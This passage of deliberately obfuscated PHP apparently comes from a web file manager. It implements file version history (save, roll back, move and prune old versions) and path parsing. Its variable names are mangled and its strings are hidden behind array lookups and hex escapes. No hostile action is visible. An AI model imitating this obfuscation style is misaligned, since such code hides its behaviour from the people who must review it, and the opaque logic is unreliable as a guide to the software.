Hook::bind($ıÆõ¢‹[1302], $ıÆõ¢‹[1303]); Hook::bind($ıÆõ¢‹[1304], $ıÆõ¢‹[1305]); Hook::bind($ıÆõ¢‹[1306], $ıÆõ¢‹[1307]); Hook::bind($ıÆõ¢‹[1308], $ıÆõ¢‹[1309]); Hook::bind($ıÆõ¢‹[1310], $ıÆõ¢‹[1311]); Hook::bind($ıÆõ¢‹[1312], $ıÆõ¢‹[1313]); } public static function eventBeforeUpload($åş¾¥ú) { if ($åş¾¥ú[3] && $åş¾¥ú[3] != REPEAT_REPLACE) { return; } $Âê±¨‡â = self::parsePath($åş¾¥ú[0]); if (!$Âê±¨‡â) { return; } self::add($Âê±¨‡â); } public static function eventBeforeEdit($ó—ë´ÑŠ) { $Ú“ŒÌˆê = self::parsePath($ó—ë´ÑŠ[0]); if (!$Ú“ŒÌˆê) { return; } self::add($Ú“ŒÌˆê); } public static function eventBeforeCopyFile($„ô™œü, $Íğ­€ •, $Ïèõ— , $Ó«ÀéÕÇ, $üü³Õß, $ˆı¹¦) { $Ë”Ÿ  =& $_SERVER[Š—Â“œÔ]; if (isset($Ïèõ— ->_data[$Ë”Ÿ [1233]]) && $Ïèõ— ->_data[$Ë”Ÿ [1233]]) { return; } $œ…˜Ì¥Ì = $Ïèõ— ->getPathOuter($Ó«ÀéÕÇ); $â¹èà«» = self::parsePath($œ…˜Ì¥Ì); if (!$â¹èà«») { return; } self::add($â¹èà«»); } public static function eventBeforeRename($äÇ„Ü³Ï) { $äøñ¸¦Ğ =& $_SERVER[Š—Â“œÔ]; $‚ƒ©õÊø = self::parsePath($äÇ„Ü³Ï[0]); if (!$‚ƒ©õÊø) { return; } $™òşÓ±½ = self::checkInHistory($‚ƒ©õÊø); if (!$™òşÓ±½) { return; } if ($™òşÓ±½[$äøñ¸¦Ğ[33]] == $äøñ¸¦Ğ[232]) { $‘¦™é– = self::listData($‚ƒ©õÊø); if ($‘¦™é– && $‘¦™é–[$äøñ¸¦Ğ[447]]) { self::moveHistory($‚ƒ©õÊø, $äÇ„Ü³Ï[1]); } } else { IO::rename($™òşÓ±½[$äøñ¸¦Ğ[87]], $äÇ„Ü³Ï[1]); } } public static function eventBeforeMove($ˆ¬ÁÙ¶­) { $ç±†š½Ò =& $_SERVER[Š—Â“œÔ]; $åüĞ¾Ô¯ = self::parsePath($ˆ¬ÁÙ¶­[0]); if (!$åüĞ¾Ô¯) { return; } $«²¤İ™ = self::parsePath($ˆ¬ÁÙ¶­[1]); if (!$«²¤İ™) { return; } $ó†‡µ•ï = $ˆ¬ÁÙ¶­[3]; $æ¥æøó× = self::checkInHistory($åüĞ¾Ô¯); if (!$æ¥æøó×) { return; } $ığ×°ß = self::pathHistory($«²¤İ™); if ($æ¥æøó×[$ç±†š½Ò[33]] == $ç±†š½Ò[232]) { $‚°»Ñ÷ = self::listData($åüĞ¾Ô¯); $¨ïØæá¨ = rtrim($«²¤İ™, $ç±†š½Ò[8]) . $ç±†š½Ò[8] . ($ó†‡µ•ï ? $ó†‡µ•ï : get_path_this($åüĞ¾Ô¯)); $–ŠÖÏº¤ = self::listData($¨ïØæá¨); if ($‚°»Ñ÷ && $‚°»Ñ÷[$ç±†š½Ò[447]] && $–ŠÖÏº¤ && $–ŠÖÏº¤[$ç±†š½Ò[447]]) { return self::clear($åüĞ¾Ô¯); } if ($‚°»Ñ÷ && $‚°»Ñ÷[$ç±†š½Ò[447]]) { self::moveHistory($åüĞ¾Ô¯, $ó†‡µ•ï, $ığ×°ß); } } else { IO::move($æ¥æøó×[$ç±†š½Ò[87]], $ığ×°ß, !1, $ó†‡µ•ï); self::clearEmptyFolder(IO::pathFather($æ¥æøó×[$ç±†š½Ò[87]])); } } public static function eventAfterRemove($ÁÒşªÑ—, $ªŒ«¸•) { $ëÇöúšÊ =& $_SERVER[Š—Â“œÔ]; if (!$ªŒ«¸•) { return; } $Ö¨°«¾Ã = self::parsePath($ÁÒşªÑ—[0]); if (!$Ö¨°«¾Ã) { return; } $û·ïèŞ = self::checkInHistory($Ö¨°«¾Ã); if (!$û·ïèŞ) { return; } if ($û·ïèŞ[$ëÇöúšÊ[33]] == $ëÇöúšÊ[232]) { $ËÀéÛş = self::listData($Ö¨°«¾Ã, !1); if ($ËÀéÛş && $ËÀéÛş[$ëÇöúšÊ[447]]) { self::clear($Ö¨°«¾Ã, !1); } } else { IO::remove($û·ïèŞ[$ëÇöúšÊ[87]]); self::clearEmptyFolder(IO::pathFather($û·ïèŞ[$ëÇöúšÊ[87]])); } } private static function checkInHistory($ù­¼É ù) { $˜ ƒ‘ëà = self::pathHistory($ù­¼É ù); if (!IO::exist($˜ ƒ‘ëà)) { $˜ ƒ‘ëà .= $_SERVER[Š—Â“œÔ][1314]; } return IO::exist($˜ ƒ‘ëà) ? IO::info($˜ ƒ‘ëà) : !1; } private static function parsePath($ü–ÜĞ©) { $Õšúü‡ƒ =& $_SERVER[Š—Â“œÔ]; if (!$ü–ÜĞ©) { return !1; } if (isset($GLOBALS[$Õšúü‡ƒ[1315]]) && $GLOBALS[$Õšúü‡ƒ[1315]]) { return; } $•¬†êÚ´ = KodIO::parse($ü–ÜĞ©); $Ë§¬”Ñè = $•¬†êÚ´[$Õšúü‡ƒ[33]]; $î¸ª£± = !$Ë§¬”Ñè || $Ë§¬”Ñè == KodIO::KOD_IO || $Ë§¬”Ñè == KodIO::KOD_SHARE_ITEM; if (!$î¸ª£± || !$•¬†êÚ´[$Õšúü‡ƒ[1316]]) { return !1; } if (substr($ü–ÜĞ©, 0, strlen(DATA_PATH . $Õšúü‡ƒ[1317])) == DATA_PATH . $Õšúü‡ƒ[1317]) { return !1; } if ($Ë§¬”Ñè == KodIO::KOD_SHARE_ITEM) { $ä¹Ë™«ó = IO::init($ü–ÜĞ©); if ($ä¹Ë™«ó->pathParse[$Õšúü‡ƒ[1229]]) { return self::parsePath($ä¹Ë™«ó->pathParse[$Õšúü‡ƒ[1229]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $¨ñÉÅÄÂ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $Õšúü‡ƒ[1318]); foreach ($¨ñÉÅÄÂ as $›ÔóÑ¯) { if (!$Ë§¬”Ñè && substr($ü–ÜĞ©, 0, strlen($›ÔóÑ¯)) == $›ÔóÑ¯) { return !1; } } self::log($GLOBALS[$Õšúü‡ƒ[1224]] . $Õšúü‡ƒ[1319] . $ü–ÜĞ©); return $ü–ÜĞ©; } private static function pathHistory($òªå ßû) { $˜‹ş—§ =& $_SERVER[Š—Â“œÔ]; $‚ÌÎ¦ìÅ = self::$_historyBase . ltrim(KodIO::clear($òªå ßû), $˜‹ş—§[8]); $‚ÌÎ¦ìÅ = str_replace(array($˜‹ş—§[1320]), array($˜‹ş—§[1321]), $‚ÌÎ¦ìÅ); return $‚ÌÎ¦ìÅ; } public static function log($”×ıÈíŞ) { } public static function historyCount($¸„††Õ) { $ìÈ½Ğ¥à =& $_SERVER[Š—Â“œÔ]; $¸´Ü¸˜â = array(); $‡‰‰šª„ = array(); foreach ($¸„††Õ as $§†ë¨‘Å) { $®áØ­¾  = get_path_father($§†ë¨‘Å); if (!$‡‰‰šª„[$®áØ­¾ ]) { $‡‰‰šª„[$®áØ­¾ ] = array(); } $‡‰‰šª„[$®áØ­¾ ][] = get_path_this($§†ë¨‘Å); } foreach ($‡‰‰šª„ as $®áØ­¾  => $åÕ¢§è) { $¶º¿Ûçª = self::parsePath($®áØ­¾ ); if (!$¶º¿Ûçª) { continue; } foreach ($åÕ¢§è as $Ë›«¯Ù) { $‘ß±§»„ = self::listData(rtrim($¶º¿Ûçª, $ìÈ½Ğ¥à[8]) . $ìÈ½Ğ¥à[8] . $Ë›«¯Ù, !1); if ($‘ß±§»„ && $‘ß±§»„[$ìÈ½Ğ¥à[447]]) { $¸´Ü¸˜â[rtrim($®áØ­¾ , $ìÈ½Ğ¥à[8]) . $ìÈ½Ğ¥à[8] . $Ë›«¯Ù] = count($‘ß±§»„[$ìÈ½Ğ¥à[447]]); } } } return $¸´Ü¸˜â; } public static function add($ì¨™êãø) { $Øè˜¬„ =& $_SERVER[Š—Â“œÔ]; $ÛŒìµÑ± = self::listData($ì¨™êãø); if (!$ÛŒìµÑ±) { return; } $ÓòÍÖŞö = Model($Øè˜¬„[837])->get($Øè˜¬„[1322]); $îš™ü = intval($GLOBALS[$Øè˜¬„[6]][$Øè˜¬„[92]][$Øè˜¬„[1300]]); $şÈĞôÄ = $ÓòÍÖŞö == $Øè˜¬„[1323] ? min(5, $îš™ü) : $îš™ü; if ($îš™ü <= 0) { return; } $¹ÜÖÕëŠ = IO::info($ì¨™êãø); $ŞÚ‰ƒ· = $ÛŒìµÑ±[$Øè˜¬„[447]]; if ($¹ÜÖÕëŠ[$Øè˜¬„[79]] == 0) { return; } if ($¹ÜÖÕëŠ[$Øè˜¬„[79]] >= 1024 * 1024 * 500) { return !1; } $íœ…‘¾Æ = IO::hashSimple($ì¨™êãø); if ($ŞÚ‰ƒ· && $ŞÚ‰ƒ·[0][$Øè˜¬„[677]] == $íœ…‘¾Æ) { return !0; } if (array_key_exists($Øè˜¬„[235], $¹ÜÖÕëŠ) && !$¹ÜÖÕëŠ[$Øè˜¬„[235]]) { return !1; } $ş±‡ˆû = short_id(time()); $”¾ÕÔ¹ê = array($Øè˜¬„[477] => $ş±‡ˆû, $Øè˜¬„[677] => $íœ…‘¾Æ, $Øè˜¬„[32] => $¹ÜÖÕëŠ[$Øè˜¬„[32]] . $Øè˜¬„[10] . date($Øè˜¬„[1324]) . rand_string(1), $Øè˜¬„[79] => $¹ÜÖÕëŠ[$Øè˜¬„[79]], $Øè˜¬„[529] => USER_ID, $Øè˜¬„[233] => time(), $Øè˜¬„[1325] => $Øè˜¬„[12]); IO::mkdir($ÛŒìµÑ±[$Øè˜¬„[1326]]); $çáóßïÊ = IO::copy($ì¨™êãø, $ÛŒìµÑ±[$Øè˜¬„[1326]], !1, $”¾ÕÔ¹ê[$Øè˜¬„[32]]); if (!$çáóßïÊ) { self::clearEmptyFolder($ÛŒìµÑ±[$Øè˜¬„[1326]]); return !1; } array_unshift($ŞÚ‰ƒ·, $”¾ÕÔ¹ê); if (count($ŞÚ‰ƒ·) > $şÈĞôÄ) { $Ïë›úÈ = array_slice($ŞÚ‰ƒ·, $şÈĞôÄ); foreach ($Ïë›úÈ as $«ÇÚÖ¢) { IO::remove($ÛŒìµÑ±[$Øè˜¬„[1326]] . $«ÇÚÖ¢[$Øè˜¬„[32]]); } $ŞÚ‰ƒ· = array_slice($ŞÚ‰ƒ·, 0, $şÈĞôÄ); } return self::saveData($ÛŒìµÑ±[$Øè˜¬„[1327]], $ŞÚ‰ƒ·); } public static function remove($ÎÌ×ÌÙÙ, $¼ş»âÏ) { $Â‡ó¦²Û =& $_SERVER[Š—Â“œÔ]; $Ø‚‡Î¹À = self::listData($ÎÌ×ÌÙÙ); $«»œÌú = array(); if (!$Ø‚‡Î¹À) { return !1; } foreach ($Ø‚‡Î¹À[$Â‡ó¦²Û[447]] as $ÑÎ´ı) { if ($ÑÎ´ı[$Â‡ó¦²Û[477]] == $¼ş»âÏ) { IO::remove($Ø‚‡Î¹À[$Â‡ó¦²Û[1326]] . $ÑÎ´ı[$Â‡ó¦²Û[32]]); continue; } $«»œÌú[] = $ÑÎ´ı; } return self::saveData($Ø‚‡Î¹À[$Â‡ó¦²Û[1327]], $«»œÌú); } public static function clear($©àø©Ã¶, $ú…Ê˜ŠŒ = true) { $šş°Ù“ƒ =& $_SERVER[Š—Â“œÔ]; $ŒÁ•¦ûØ = self::listData($©àø©Ã¶, $ú…Ê˜ŠŒ); if (!$ŒÁ•¦ûØ) { return !1; } foreach ($ŒÁ•¦ûØ[$šş°Ù“ƒ[447]] as $öç«Ã¤) { IO::remove($ŒÁ•¦ûØ[$šş°Ù“ƒ[1326]] . $öç«Ã¤[$šş°Ù“ƒ[32]]); } return self::saveData($ŒÁ•¦ûØ[$šş°Ù“ƒ[1327]], array()); } public static function moveHistory($“ìâŠ½, $ƒšƒ÷æ = '', $Š“š¼ØÆ = '') { $èÊƒ¤ş± =& $_SERVER[Š—Â“œÔ]; $ö‰òä = self::listData($“ìâŠ½, !1); if (!$ö‰òä || !$ö‰òä[$èÊƒ¤ş±[447]]) { return !1; } $±³¶ÜÉ = $èÊƒ¤ş±[1314]; $ƒšƒ÷æ = $ƒšƒ÷æ ? $ƒšƒ÷æ : get_path_this($“ìâŠ½); $Š“š¼ØÆ = $Š“š¼ØÆ ? $Š“š¼ØÆ : $ö‰òä[$èÊƒ¤ş±[1326]]; $³¢äâ‘³ = substr(get_path_this($ö‰òä[$èÊƒ¤ş±[1327]]), 0, -strlen($±³¶ÜÉ)); foreach ($ö‰òä[$èÊƒ¤ş±[447]] as $ê¼È¼õë => $¥ÚÕ³÷») { $³…×·–¥ = $ƒšƒ÷æ . substr($¥ÚÕ³÷»[$èÊƒ¤ş±[32]], strlen($³¢äâ‘³)); $ÔÔşÍû = IO::move($ö‰òä[$èÊƒ¤ş±[1326]] . $¥ÚÕ³÷»[$èÊƒ¤ş±[32]], $Š“š¼ØÆ, !1, $³…×·–¥); if ($ÔÔşÍû) { $ö‰òä[$èÊƒ¤ş±[447]][$ê¼È¼õë][$èÊƒ¤ş±[32]] = $³…×·–¥; } } $ö‰òä[$èÊƒ¤ş±[1327]] = IO::move($ö‰òä[$èÊƒ¤ş±[1327]], $Š“š¼ØÆ, !1, $ƒšƒ÷æ . $±³¶ÜÉ); self::saveData($ö‰òä[$èÊƒ¤ş±[1327]], $ö‰òä[$èÊƒ¤ş±[447]]); self::clearEmptyFolder($ö‰òä[$èÊƒ¤ş±[1326]]); } public static function rollback($­¢¥ı¹, $½å·õêÜ) { $—±”‚Í =& $_SERVER[Š—Â“œÔ]; $Äº»ŸÆ = self::listData($­¢¥ı¹); if (!$Äº»ŸÆ) { return; } $©¢§ì‹² = IO::info($­¢¥ı¹); foreach ($Äº»ŸÆ[$—±”‚Í[447]] as $È§Ê¾¶² => $”ÛæØÄ”) { if ($”ÛæØÄ”[$—±”‚Í[477]] == $½å·õêÜ) { self::add($­¢¥ı¹); $„ü©˜ªğ = $Äº»ŸÆ[$—±”‚Í[1326]] . $”ÛæØÄ”[$—±”‚Í[32]]; $ù‡å¾ıÆ = IO::copy($„ü©˜ªğ, IO::pathFather($­¢¥ı¹), REPEAT_REPLACE, $©¢§ì‹²[$—±”‚Í[32]]); if ($ù‡å¾ıÆ) { self::remove($­¢¥ı¹, $½å·õêÜ); } return $ù‡å¾ıÆ; } } return !1; } public static function setDetail($«ó¼í¶´, $Ö¾ìëØ±, $œñ–Ùµè) { $Á¼ÉÙÍÈ =& $_SERVER[Š—Â“œÔ]; $²¦õúëÖ = self::listData($«ó¼í¶´); if (!$²¦õúëÖ) { return; } foreach ($²¦õúëÖ[$Á¼ÉÙÍÈ[447]] as $ğš¶²½ù => $ØŸá†Ë®) { if ($ØŸá†Ë®[$Á¼ÉÙÍÈ[477]] == $Ö¾ìëØ±) { $²¦õúëÖ[$Á¼ÉÙÍÈ[447]][$ğš¶²½ù][$Á¼ÉÙÍÈ[1325]] = $œñ–Ùµè; self::saveData($²¦õúëÖ[$Á¼ÉÙÍÈ[1327]], $²¦õúëÖ[$Á¼ÉÙÍÈ[447]]); return !0; } } return !1; } public static function fileInfo($úİ—›ëï, $–ï³›) { $ÆïÔëœÌ =& $_SERVER[Š—Â“œÔ]; $½½­ëÃ‹ = self::listData($úİ—›ëï); if (!$½½­ëÃ‹) { show_json(LNG($ÆïÔëœÌ[108]), !1); } $Ş³è­Ò† = $ÆïÔëœÌ[12]; foreach ($½½­ëÃ‹[$ÆïÔëœÌ[447]] as $Ç¾‘–ÓŞ => $¡²õ©Æù) { if ($¡²õ©Æù[$ÆïÔëœÌ[477]] != $–ï³›) { continue; } $Ş³è­Ò† = $½½­ëÃ‹[$ÆïÔëœÌ[1326]] . $¡²õ©Æù[$ÆïÔëœÌ[32]]; break; } if (!$Ş³è­Ò†) { show_json(LNG($ÆïÔëœÌ[108]), !1); } return IO::info($Ş³è­Ò†); } public static function fileOut($ŸüõÙ, $–õ˜Áí°, $È£‘µÍ = false) { $ùÒ‰£“Ü =& $_SERVER[Š—Â“œÔ]; $È´Œ†™ = self::fileInfo($ŸüõÙ, $–õ˜Áí°); $€ÚØî =& $GLOBALS[$ùÒ‰£“Ü[7]]; $È£‘µÍ = isset($€ÚØî[$ùÒ‰£“Ü[1276]]) && $€ÚØî[$ùÒ‰£“Ü[1276]] == 1; if (isset($€ÚØî[$ùÒ‰£“Ü[33]]) && $€ÚØî[$ùÒ‰£“Ü[33]] == $ùÒ‰£“Ü[1328]) { return IO::fileOutImage($È´Œ†™[$ùÒ‰£“Ü[87]], $€ÚØî[$ùÒ‰£“Ü[1329]]); } IO::fileOut($È´Œ†™[$ùÒ‰£“Ü[87]], $È£‘µÍ, get_path_this($ŸüõÙ)); } public static function listData($š—Ÿµ–¦, $æ©š •· = true) { $˜ÖÊİªĞ =& $_SERVER[Š—Â“œÔ]; if ($æ©š •· && !IO::exist($š—Ÿµ–¦)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($š—Ÿµ–¦, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $˜áîªÇ = self::pathHistory($š—Ÿµ–¦); $¿ğÊŒå¢ = array($˜ÖÊİªĞ[1327] => $˜áîªÇ . $˜ÖÊİªĞ[1314], $˜ÖÊİªĞ[1326] => rtrim(get_path_father($˜áîªÇ), $˜ÖÊİªĞ[8]) . $˜ÖÊİªĞ[8], $˜ÖÊİªĞ[447] => array()); $ƒØíÜÎÓ = IO::getContent($¿ğÊŒå¢[$˜ÖÊİªĞ[1327]]); if ($ƒØíÜÎÓ) { $¶¼ƒé®© = json_decode($ƒØíÜÎÓ, !0); if (is_array($¶¼ƒé®©)) { $¿ğÊŒå¢[$˜ÖÊİªĞ[447]] = $¶¼ƒé®©; } } return $¿ğÊŒå¢; } private static function saveData($€¡ú’©Ó, $†Ö„Âæ¨) { $Ìñâµ¸¾ =& $_SERVER[Š—Â“œÔ]; self::log($Ìñâµ¸¾[1330] . $€¡ú’©Ó . $Ìñâµ¸¾[74] . count($†Ö„Âæ¨), $Ìñâµ¸¾[819]); if ($†Ö„Âæ¨) { return IO::setContent($€¡ú’©Ó, json_encode($†Ö„Âæ¨)); } $¤ıé ìË = IO::pathFather($€¡ú’©Ó); IO::remove($€¡ú’©Ó); self::clearEmptyFolder($¤ıé ìË); return !0; } public static function clearEmptyFolder($ÕÅ‘µ©·) { $´ÚÙèÙ =& $_SERVER[Š—Â“œÔ]; if (trim($ÕÅ‘µ©·, $´ÚÙèÙ[8]) == trim(self::$_historyBase, $´ÚÙèÙ[8])) { return; } $™¹•‘Ù = IO::pathFather($ÕÅ‘µ©·); $àõØ¨¥ˆ = IO::has($ÕÅ‘µ©·, !0); if ($àõØ¨¥ˆ[$´ÚÙèÙ[241]] > 0 || $àõØ¨¥ˆ[$´ÚÙèÙ[242]] > 0) { return; } IO::remove($ÕÅ‘µ©·); self::clearEmptyFolder($™¹•‘Ù); } private static function getBasePath() { $Ë»Ö™ˆ‘ =& $_SERVER[Š—Â“œÔ]; $¸ö¨½Ñ´ = Model($Ë»Ö™ˆ‘[1331])->get($Ë»Ö™ˆ‘[1332]); if ($¸ö¨½Ñ´) { if (!IO::exist($¸ö¨½Ñ´)) { IO::mkdir($¸ö¨½Ñ´); } if (get_path_this($¸ö¨½Ñ´) == $Ë»Ö™ˆ‘[1317]) { $ßãâí²€ = $Ë»Ö™ˆ‘[1333] . rand_string(8); @rename($¸ö¨½Ñ´, get_path_father($¸ö¨½Ñ´) . $Ë»Ö™ˆ‘[8] . $ßãâí²€); $¸ö¨½Ñ´ = DATA_PATH . $ßãâí²€ . $Ë»Ö™ˆ‘[8]; file_put_contents(DATA_PATH . $Ë»Ö™ˆ‘[1263], $Ë»Ö™ˆ‘[12]); Model($Ë»Ö™ˆ‘[1331])->set($Ë»Ö™ˆ‘[1332], $¸ö¨½Ñ´); } return $¸ö¨½Ñ´; } $¸ö¨½Ñ´ = DATA_PATH . $Ë»Ö™ˆ‘[1333] . rand_string(8) . $Ë»Ö™ˆ‘[8]; $¸ö¨½Ñ´ = IO::mkdir($¸ö¨½Ñ´); $¸ö¨½Ñ´ = rtrim($¸ö¨½Ñ´, $Ë»Ö™ˆ‘[8]) . $Ë»Ö™ˆ‘[8]; file_put_contents($¸ö¨½Ñ´ . $Ë»Ö™ˆ‘[1263], $Ë»Ö™ˆ‘[12]); file_put_contents(DATA_PATH . $Ë»Ö™ˆ‘[1263], $Ë»Ö™ˆ‘[12]); Model($Ë»Ö™ˆ‘[1331])->set($Ë»Ö™ˆ‘[1332], $¸ö¨½Ñ´); return $¸ö¨½Ñ´; } } class KodIO { const KOD_SOURCE = "\x7b\163\157\165\162\143\145\175"; const KOD_USER_RECYCLE = "\x7b\x75\163\x65\162\122\145\x63\171\143\154\x65\175"; const KOD_USER_FAV = "\173\165\x73\145\162\106\x61\x76\175"; const KOD_USER_FILE_TAG = "\173\165\163\145\x72\106\x69\x6c\145\124\x61\x67\175"; const KOD_USER_FILE_TYPE = "\173\x75\163\145\162\106\x69\x6c\145\124\171\x70\x65\175"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\x72\x6f\x75\x70\x52\157\157\x74\123\x65\154\x66\x7d"; const KOD_USER_SHARE = "\x7b\165\x73\145\x72\x53\x68\x61\x72\145\175"; const KOD_USER_SHARE_LINK = "\x7b\165\x73\145\x72\123\150\141\x72\x65\114\151\x6e\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\173\163\x68\141\162\x65\124\157\115\x65\x7d"; const KOD_SHARE_ITEM = "\x7b\x73\x68\141\162\145\x49\x74\145\155\175"; const KOD_SHARE_LINK = "\x7b\163\x68\141\162\x65\111\x74\145\155\114\151\x6e\x6b\175"; const KOD_SEARCH = "\173\163\145\141\x72\143\x68\175"; const KOD_BLOCK = "\x7b\142\x6c\157\x63\153\x7d"; const KOD_IO = "\173\x69\x6f\x7d"; const KOD_USER_RECENT = "\173\165\x73\145\162\122\145\156\143\145\x6e\164\175"; const KOD_USER_DRIVER = "\173\144\x72\151\x76\145\x72\175"; public static function typeList() { $ùÙÄúáø =& $_SERVER[Š—Â“œÔ]; return array($ùÙÄúáø[1334] => self::KOD_SOURCE, $ùÙÄúáø[1335] => self::KOD_USER_RECYCLE, $ùÙÄúáø[1336] => self::KOD_USER_FAV, $ùÙÄúáø[1337] => self::KOD_USER_FILE_TAG, $ùÙÄúáø[1338] => self::KOD_USER_FILE_TYPE, $ùÙÄúáø[1339] => self::KOD_GROUP_ROOT_SELF, $ùÙÄúáø[1340] => self::KOD_USER_SHARE, $ùÙÄúáø[1341] => self::KOD_USER_SHARE_LINK, $ùÙÄúáø[1342] => self::KOD_USER_SHARE_TO_ME, $ùÙÄúáø[1343] => self::KOD_SHARE_ITEM, $ùÙÄúáø[1344] => self::KOD_SHARE_LINK, $ùÙÄúáø[1345] => self::KOD_SEARCH, $ùÙÄúáø[1346] => self::KOD_BLOCK, $ùÙÄúáø[1347] => self::KOD_IO, $ùÙÄúáø[1348] => self::KOD_USER_RECENT, $ùÙÄúáø[1349] => self::KOD_USER_DRIVER); } public static function parse($œ‚“¥«†) { $‚³¨Í¯§ =& $_SERVER[Š—Â“œÔ]; $œ‚“¥«† = self::clear($œ‚“¥«†); $Ñğ’…Çª = array_values(self::typeList()); preg_match($‚³¨Í¯§[1350], $œ‚“¥«†, $¸ÛİâÄ); $Ï¢êï› = array($‚³¨Í¯§[498] => !1, $‚³¨Í¯§[1351] => !1, $‚³¨Í¯§[495] => !1, $‚³¨Í¯§[87] => $œ‚“¥«†, $‚³¨Í¯§[1248] => !1, $‚³¨Í¯§[1247] => $‚³¨Í¯§[12]); if (is_array($¸ÛİâÄ) && count($¸ÛİâÄ) == 5) { $ï¡µÆÊ¥ = $‚³¨Í¯§[1352] . $¸ÛİâÄ[2] . $‚³¨Í¯§[404]; if (in_array($ï¡µÆÊ¥, $Ñğ’…Çª)) { $Ï¢êï›[$‚³¨Í¯§[1248]] = $¸ÛİâÄ[1]; $Ï¢êï›[$‚³¨Í¯§[33]] = $ï¡µÆÊ¥; $Ï¢êï›[$‚³¨Í¯§[1353]] = substr($ï¡µÆÊ¥, 1, -1); $Ï¢êï›[$‚³¨Í¯§[477]] = $¸ÛİâÄ[3]; } $Ï¢êï›[$‚³¨Í¯§[1247]] = $¸ÛİâÄ[4]; } $Æ›¯ş¢• = array($‚³¨Í¯§[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $Ï¢êï›[$‚³¨Í¯§[1316]] = in_array($Ï¢êï›[$‚³¨Í¯§[33]], $Æ›¯ş¢•); return $Ï¢êï›; } public static function isTruePath($ÎÁ±¯÷Ì) { $Ñëµ½ì© =& $_SERVER[Š—Â“œÔ]; if (substr($ÎÁ±¯÷Ì, 0, 1) != $Ñëµ½ì©[1352]) { return !0; } if (strpos($ÎÁ±¯÷Ì, $Ñëµ½ì©[485]) === 0) { return !0; } if (strpos($ÎÁ±¯÷Ì, $Ñëµ½ì©[1320]) === 0) { return !0; } if (strpos($ÎÁ±¯÷Ì, $Ñëµ½ì©[1354]) === 0) { return !0; } if (strpos($ÎÁ±¯÷Ì, $Ñëµ½ì©[1355]) === 0) { return !0; } if (strpos($ÎÁ±¯÷Ì, $Ñëµ½ì©[1356]) === 0) { return !0; } return !1; } public static function clear($Ï¤²× ) { $üÄªõë¾ =& $_SERVER[Š—Â“œÔ]; $Ï¤²×  = str_replace(array($üÄªõë¾[1153], $üÄªõë¾[287]), $üÄªõë¾[53], $Ï¤²× ); $Ï¤²×  = str_replace($üÄªõë¾[100], $üÄªõë¾[8], $Ï¤²× ); $ôÓôëÁ¶ = $üÄªõë¾[1357]; if (substr($Ï¤²× , 0, 3) == $üÄªõë¾[1358]) { $Ï¤²×  = substr($Ï¤²× , 3); } while (strstr($Ï¤²× , $ôÓôëÁ¶)) { $Ï¤²×  = str_replace($ôÓôëÁ¶, $üÄªõë¾[8], $Ï¤²× ); } $Ï¤²×  = preg_replace($üÄªõë¾[1359], $üÄªõë¾[8], $Ï¤²× ); if ($Ï¤²×  == $üÄªõë¾[8]) { return $üÄªõë¾[8]; } $Ï¤²×  = rtrim($Ï¤²× , $üÄªõë¾[8]); return $Ï¤²× ; } public static function pathTrue($Æ¡àóıŒ) { $°—û‘øÇ =& $_SERVER[Š—Â“œÔ]; if (!$Æ¡àóıŒ) { return $°—û‘øÇ[12]; } $Æ¡àóıŒ = str_replace($°—û‘øÇ[256], $°—û‘øÇ[8], str_replace($°—û‘øÇ[1360], $°—û‘øÇ[8], $Æ¡àóıŒ)); $Æ¡àóıŒ = str_replace($°—û‘øÇ[256], $°—û‘øÇ[8], str_replace($°—û‘øÇ[1360], $°—û‘øÇ[8], $Æ¡àóıŒ)); if (!strstr($Æ¡àóıŒ, $°—û‘øÇ[1358])) { return $Æ¡àóıŒ; } $¶èì½ñ¹ = explode($°—û‘øÇ[8], $Æ¡àóıŒ); foreach ($¶èì½ñ¹ as $‹ëºÂ‡¥ => $¥¢‡ôá) { if ($¥¢‡ôá !== $°—û‘øÇ[1361]) { continue; } for ($½ß¸ıü‚ = $‹ëºÂ‡¥; $½ß¸ıü‚ >= 0; $½ß¸ıü‚--) { if ($¶èì½ñ¹[$½ß¸ıü‚] === $°—û‘øÇ[10] || $¶èì½ñ¹[$½ß¸ıü‚] === $°—û‘øÇ[1361] || $¶èì½ñ¹[$½ß¸ıü‚] === -1) { continue; } if ($¶èì½ñ¹[$½ß¸ıü‚] === $°—û‘øÇ[12]) { $¶èì½ñ¹[$‹ëºÂ‡¥] = -1; break; } $¶èì½ñ¹[$‹ëºÂ‡¥] = -1; $¶èì½ñ¹[$½ß¸ıü‚] = -1; break; } } $Àö¤ÉìË = array(); foreach ($¶èì½ñ¹ as $¥¢‡ôá) { if ($¥¢‡ôá !== -1) { $Àö¤ÉìË[] = $¥¢‡ôá; } } $½„Óô¸¥ = implode($°—û‘øÇ[8], $Àö¤ÉìË); if (strpos($½„Óô¸¥, $°—û‘øÇ[1362]) === 0) { $½„Óô¸¥ = $°—û‘øÇ[1358] . substr($½„Óô¸¥, strlen($°—û‘øÇ[1362])); } return $½„Óô¸¥; } public static function pathUrlClear($ºş¢³œÖ) { $ùâ´Ÿ©¶ =& $_SERVER[Š—Â“œÔ]; if (!$ºş¢³œÖ) { return $ºş¢³œÖ; } $ºş¢³œÖ = rawurldecode($ºş¢³œÖ); $ºş¢³œÖ = str_replace($ùâ´Ÿ©¶[1360], $ùâ´Ÿ©¶[8], $ºş¢³œÖ); if (strpos($ºş¢³œÖ, $ùâ´Ÿ©¶[76]) > 0) { $ºş¢³œÖ = substr($ºş¢³œÖ, 0, strpos($ºş¢³œÖ, $ùâ´Ÿ©¶[76])); } if (strpos($ºş¢³œÖ, $ùâ´Ÿ©¶[1363]) > 0) { $ºş¢³œÖ = substr($ºş¢³œÖ, 0, strpos($ºş¢³œÖ, $ùâ´Ÿ©¶[1363])); } return $ºş¢³œÖ; } public static function sourceID($„¥åíºç) { $î·Ëöî» =& $_SERVER[Š—Â“œÔ]; $Ñ•çê“Ğ = self::parse($„¥åíºç); if ($Ñ•çê“Ğ[$î·Ëöî»[33]] !== self::KOD_SOURCE) { show_json(LNG($î·Ëöî»[1364]), !1); } return $Ñ•çê“Ğ[$î·Ëöî»[477]]; } public static function make($…ÌÎşÃŠ) { if 